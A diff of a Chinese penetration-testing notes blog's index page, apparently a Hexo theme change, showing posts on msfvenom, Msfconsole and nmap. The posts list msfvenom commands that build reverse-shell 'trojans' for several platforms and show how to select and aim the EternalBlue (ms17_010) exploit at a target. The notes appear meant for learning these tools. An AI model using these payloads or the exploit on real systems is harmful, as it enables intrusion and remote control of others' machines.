@@ -1,141 +1,240 @@
 <!DOCTYPE html>
-<html>
+<html lang="zh-CN">
 <head>
-  <meta charset="utf-8">
-  
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
 
-  
-  <title>Hexo</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta property="og:type" content="website">
-<meta property="og:title" content="Hexo">
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="花有重开日，人无再少年。">
+<meta property="og:type" content="website">
+<meta property="og:title" content="Pokerface博客">
 <meta property="og:url" content="http://example.com/index.html">
-<meta property="og:site_name" content="Hexo">
-<meta property="og:locale" content="en_US">
-<meta property="article:author" content="John Doe">
+<meta property="og:site_name" content="Pokerface博客">
+<meta property="og:description" content="花有重开日，人无再少年。">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:author" content="Pokerface">
 <meta name="twitter:card" content="summary">
-  
-    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
-  
-  
-    <link rel="icon" href="/favicon.png">
-  
-  
-    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
-  
-  
-<link rel="stylesheet" href="/css/style.css">
 
-<meta name="generator" content="Hexo 5.4.0"></head>
+<link rel="canonical" href="http://example.com/">
 
-<body>
-  <div id="container">
-    <div id="wrap">
-      <header id="header">
-  <div id="banner"></div>
-  <div id="header-outer" class="outer">
-    <div id="header-title" class="inner">
-      <h1 id="logo-wrap">
-        <a href="/" id="logo">Hexo</a>
-      </h1>
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : true,
+    isPost : false,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>Pokerface博客</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Pokerface博客</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">记录学习过程和一些笔记</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content index posts-expand">
+            
       
-    </div>
-    <div id="header-inner" class="inner">
-      <nav id="main-nav">
-        <a id="main-nav-toggle" class="nav-icon"></a>
-        
-          <a class="main-nav-link" href="/">Home</a>
-        
-          <a class="main-nav-link" href="/archives">Archives</a>
-        
-      </nav>
-      <nav id="sub-nav">
-        
-          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
-        
-        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
-      </nav>
-      <div id="search-form-wrap">
-        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
-      </div>
-    </div>
-  </div>
-</header>
-      <div class="outer">
-        <section id="main">
   
-    <article id="post-hello-world" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2021/11/15/hello-world/" class="article-date">
-  <time datetime="2021-11-15T07:12:32.487Z" itemprop="datePublished">2021-11-15</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
   
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/11/15/hello-world/">Hello World</a>
-    </h1>
-  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/11/15/Msfvenom/">
 
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Pokerface">
+      <meta itemprop="description" content="花有重开日，人无再少年。">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Pokerface博客">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2021/11/15/Msfvenom/" class="post-title-link" itemprop="url">Msfvenom</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2021-11-15 11:25:23 / 修改时间：22:15:55" itemprop="dateCreated datePublished" datetime="2021-11-15T11:25:23+08:00">2021-11-15</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%B8%97%E9%80%8F/" itemprop="url" rel="index"><span itemprop="name">渗透</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
       </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
 
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/writing.html">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/server.html">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/generating.html">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2021/11/15/hello-world/" data-id="ckw0of74x00033sjw02i1biih" class="article-share-link">Share</a>
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-    <article id="post-Msfvenom" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2021/11/15/Msfvenom/" class="article-date">
-  <time datetime="2021-11-15T03:25:23.000Z" itemprop="datePublished">2021-11-15</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
     
     
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/11/15/Msfvenom/">Msfvenom</a>
-    </h1>
-  
-
-      </header>
     
-    <div class="article-entry" itemprop="articleBody">
+    <div class="post-body" itemprop="articleBody">
+
       
-        <h2 id="Msfvenom"><a href="#Msfvenom" class="headerlink" title="Msfvenom"></a>Msfvenom</h2><p>Msfvenom参数：</p>
+          <h2 id="Msfvenom"><a href="#Msfvenom" class="headerlink" title="Msfvenom"></a>Msfvenom</h2><p>Msfvenom参数：</p>
 <p>用法：/usr/bin/msfvenom[选项]&lt;var=val&gt;</p>
 <p>示例：/usr/bin/msfvenom-p windows/meterpeter/reverse_tcp LHOST=<IP>-f exe-o payload.exe</p>
 <p>选项：</p>
@@ -165,75 +264,112 @@
 <p>-v、 –var name<value>指定用于某些输出格式的自定义变量名</p>
 <p>-t、 –timeout<second>从STDIN读取有效负载时等待的秒数（默认值为30，0表示禁用）</p>
 <p>常用木马：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Windows:</span><br><span class="line">格式：msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=[IP] LPORT=[PORT] -f exe &gt; shell.exe</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Windows:
+格式：msfvenom -p windows/x64/meterpreter/reverse_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span><span class="token punctuation">[</span>IP<span class="token punctuation">]</span> <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token punctuation">[</span>PORT<span class="token punctuation">]</span> -f exe <span class="token operator">></span> shell.exe<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
 
 
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Liunx：</span><br><span class="line">格式：msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f elf &gt; shell.elf</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Liunx：
+格式：msfvenom -p linux/x64/meterpreter/reverse_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span><span class="token operator">&lt;</span>IP<span class="token operator">></span> <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token operator">&lt;</span>PORT<span class="token operator">></span> -f elf <span class="token operator">></span> shell.elf<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
 
 
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PHP：</span><br><span class="line">格式：msfvenom -p php/meterpreter_reverse_tcp LHOST=[IP] LPORT=[PORT] -f raw &gt; shell.php</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">PHP：
+格式：msfvenom -p php/meterpreter_reverse_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span><span class="token punctuation">[</span>IP<span class="token punctuation">]</span> <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token punctuation">[</span>PORT<span class="token punctuation">]</span> -f raw <span class="token operator">></span> shell.php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
 
 
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ASP：</span><br><span class="line">格式：msfvenom -p windows/meterpreter/reverse_tcp LHOST=[IP] LPORT=[PORT] -f asp &gt; shell.asp</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ASP：
+格式：msfvenom -p windows/meterpreter/reverse_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span><span class="token punctuation">[</span>IP<span class="token punctuation">]</span> <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token punctuation">[</span>PORT<span class="token punctuation">]</span> -f asp <span class="token operator">></span> shell.asp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
 
 
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">JSP：</span><br><span class="line">格式：msfvenom -p java/jsp_shell_reverse_tcp LHOST=[IP] LPORT=[PORT] -f raw &gt; shell.jsp</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-BASH" data-language="BASH"><code class="language-BASH">JSP：
+格式：msfvenom -p java&#x2F;jsp_shell_reverse_tcp LHOST&#x3D;[IP] LPORT&#x3D;[PORT] -f raw &gt; shell.jsp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
 
 
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Python：</span><br><span class="line">格式：msfvenom -p cmd/unix/reverse_python LHOST=[IP] LPORT=[PORT] -f raw &gt; shell.py</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Python：
+格式：msfvenom -p cmd/unix/reverse_python <span class="token assign-left variable">LHOST</span><span class="token operator">=</span><span class="token punctuation">[</span>IP<span class="token punctuation">]</span> <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token punctuation">[</span>PORT<span class="token punctuation">]</span> -f raw <span class="token operator">></span> shell.py<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
 
 
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Bash：</span><br><span class="line">格式：msfvenom -p cmd/unix/reverse_bash LHOST=[IP] LPORT=[PORT] -f raw &gt; shell.sh</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Bash：
+格式：msfvenom -p cmd/unix/reverse_bash <span class="token assign-left variable">LHOST</span><span class="token operator">=</span><span class="token punctuation">[</span>IP<span class="token punctuation">]</span> <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token punctuation">[</span>PORT<span class="token punctuation">]</span> -f raw <span class="token operator">></span> shell.sh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
 
 
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Perl：</span><br><span class="line">格式：msfvenom -p cmd/unix/reverse_perl LHOST=[IP] LPORT=&lt;[PORT] -f raw &gt; shell.pl</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Perl：
+格式：msfvenom -p cmd/unix/reverse_perl <span class="token assign-left variable">LHOST</span><span class="token operator">=</span><span class="token punctuation">[</span>IP<span class="token punctuation">]</span> <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token operator">&lt;</span><span class="token punctuation">[</span>PORT<span class="token punctuation">]</span> -f raw <span class="token operator">></span> shell.pl<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
 
       
     </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2021/11/15/Msfvenom/" data-id="ckw0of74z00043sjwh1ec1kzu" class="article-share-link">Share</a>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
       
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7/" rel="tag">渗透工具</a></li></ul>
-
-    </footer>
-  </div>
   
-</article>
-
-
   
-    <article id="post-Msfconsole" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2021/11/15/Msfconsole/" class="article-date">
-  <time datetime="2021-11-15T00:55:36.000Z" itemprop="datePublished">2021-11-15</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/11/15/Msfconsole/">Msfconsole</a>
-    </h1>
-  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/11/15/Msfconsole/">
 
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Pokerface">
+      <meta itemprop="description" content="花有重开日，人无再少年。">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Pokerface博客">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2021/11/15/Msfconsole/" class="post-title-link" itemprop="url">Msfconsole</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2021-11-15 08:55:36 / 修改时间：22:15:51" itemprop="dateCreated datePublished" datetime="2021-11-15T08:55:36+08:00">2021-11-15</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%B8%97%E9%80%8F/" itemprop="url" rel="index"><span itemprop="name">渗透</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
       </header>
+
     
-    <div class="article-entry" itemprop="articleBody">
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
       
-        <h2 id="Msfconsole"><a href="#Msfconsole" class="headerlink" title="Msfconsole"></a>Msfconsole</h2><p><strong>Msfconsole初始化参数：</strong></p>
+          <h2 id="Msfconsole"><a href="#Msfconsole" class="headerlink" title="Msfconsole"></a>Msfconsole</h2><p><strong>Msfconsole初始化参数：</strong></p>
 <p>-E、 –环境环境设置Rails环境，默认为RAIL_ENV环境变量或“production”</p>
 <p>-M、 –迁移路径目录指定包含其他数据库迁移的目录</p>
 <p>-n、 –无数据库禁用数据库支持</p>
@@ -288,11 +424,12 @@
 <p>启动软件：</p>
 <p><img src="C:\Users\Joker\AppData\Roaming\Typora\typora-user-images\image-20211115092227388.png" alt="image-20211115092227388"></p>
 <p>搜索Ms17_010模块并选择：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">格式：search </span><br><span class="line">格式：use exploit/windows/smb/ms17_010_eternalblue</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">格式：search 
+格式：use exploit/windows/smb/ms17_010_eternalblue<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
 <p><img src="C:\Users\Joker\AppData\Roaming\Typora\typora-user-images\image-20211115092612394.png" alt="image-20211115092612394"></p>
 <p>列出当前选择模块的可用内容：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">格式：show options</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">格式：show options<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="C:\Users\Joker\AppData\Roaming\Typora\typora-user-images\image-20211115093615405.png" alt="image-20211115093615405"></p>
 <p>利用set设置上面显示内容的RHOSTS 指定要攻击的电脑IP</p>
@@ -324,42 +461,77 @@
 
       
     </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2021/11/15/Msfconsole/" data-id="ckw0of74q00003sjwcoy13f6i" class="article-share-link">Share</a>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
       
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7/" rel="tag">渗透工具</a></li></ul>
-
-    </footer>
-  </div>
   
-</article>
-
-
   
-    <article id="post-nmap工具" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2021/11/12/nmap%E5%B7%A5%E5%85%B7/" class="article-date">
-  <time datetime="2021-11-12T02:39:57.000Z" itemprop="datePublished">2021-11-12</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/11/12/nmap%E5%B7%A5%E5%85%B7/">nmap扫描</a>
-    </h1>
-  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/11/12/nmap%E5%B7%A5%E5%85%B7/">
 
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Pokerface">
+      <meta itemprop="description" content="花有重开日，人无再少年。">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Pokerface博客">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2021/11/12/nmap%E5%B7%A5%E5%85%B7/" class="post-title-link" itemprop="url">nmap扫描</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2021-11-12 10:39:57" itemprop="dateCreated datePublished" datetime="2021-11-12T10:39:57+08:00">2021-11-12</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-11-15 22:16:01" itemprop="dateModified" datetime="2021-11-15T22:16:01+08:00">2021-11-15</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%B8%97%E9%80%8F/" itemprop="url" rel="index"><span itemprop="name">渗透</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
       </header>
+
     
-    <div class="article-entry" itemprop="articleBody">
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
       
-        <h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2><p><strong>Nmap参数：</strong></p>
+          <h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2><p><strong>Nmap参数：</strong></p>
 <p>-A #进行综合性扫描<br>       -O #进行系统版本扫描<br>       -p #指定端口扫描<br>       -v #显示扫描过程<br>       -e #指定网卡进行扫描<br>       -T #加速扫描过程，默认时序4，最高为6<br>       -n #不进行dns解析<br>       -Pn #不进行ping扫描<br>       -sP #判断主机存活<br>       -sS #SYN半连接扫描探测端口开放状态<br>       -sV #进行服务版本扫描<br>       -sX #圣诞树扫描<br>       -sF FIN扫描<br>       -sU #使用UDP扫描方式确定UDP端口状态<br>       -sT #TCP端口扫描<br>       -sW #滑动窗口扫描<br>       -sO #主机协议扫描<br>       -sL #dns反向解析<br>       -sR #RPC扫描<br>       -sL #完全隐藏扫描<br>       -sn #只进行主机发现，不进行端口扫描<br>       -oX #将扫描结果生成xml文件<br>       -iL #指定文本文件扫描</p>
 <p><strong>Nmap脚本扫描：</strong></p>
 <p>脚本存放路径：/usr/share/nmap/scripts</p>
@@ -382,42 +554,77 @@
 
       
     </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2021/11/12/nmap%E5%B7%A5%E5%85%B7/" data-id="ckw0of74z00053sjwbjqzc59c" class="article-share-link">Share</a>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
       
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7/" rel="tag">渗透工具</a></li></ul>
-
-    </footer>
-  </div>
   
-</article>
-
-
   
-    <article id="post-sqlmap工具" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2021/11/12/sqlmap%E5%B7%A5%E5%85%B7/" class="article-date">
-  <time datetime="2021-11-12T00:17:08.000Z" itemprop="datePublished">2021-11-12</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/11/12/sqlmap%E5%B7%A5%E5%85%B7/">sqlmap工具</a>
-    </h1>
-  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/11/12/sqlmap%E5%B7%A5%E5%85%B7/">
 
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Pokerface">
+      <meta itemprop="description" content="花有重开日，人无再少年。">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Pokerface博客">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
